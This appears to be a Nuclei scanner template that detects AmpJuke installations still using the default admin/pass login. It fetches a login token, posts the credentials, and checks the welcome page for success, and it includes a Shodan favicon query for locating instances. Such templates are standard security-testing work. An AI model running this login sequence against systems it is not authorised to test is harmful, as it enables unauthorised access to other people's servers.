id: ampjuke-default-login

info:
  name: AmpJuke Default Credentials
  author: ritikchaddha
  severity: high
  description: AmpJuke default login credentials were discovered.
  metadata:
    max-request: 3
    shodan-query: http.favicon.hash:-121681558
    runzero-match: service["favicon.ico.image.mmh3"] == "-121681558"
  tags: default-login,ampjuke

http:
  - raw:
      - |
        GET /login.php HTTP/2
        Host: {{Hostname}}
      - |
        POST /loginvalidate.php HTTP/2
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        uuid={{url_encode(token)}}&login={{username}}&password={{password}}&Submit=Submit
      - |
        GET /index.php?what=welcome HTTP/2
        Host: {{Hostname}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - pass

    matchers-condition: and
    matchers:
      - type: word
        part: body_3
        words:
          - AmpJuke
          - Track
          - Logout
          - Random play
        condition: and
        case-insensitive: true

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body_1
        name: token
        group: 1
        regex:
          - name="uuid" value="([./a-z0-9-]+)">
        internal: true

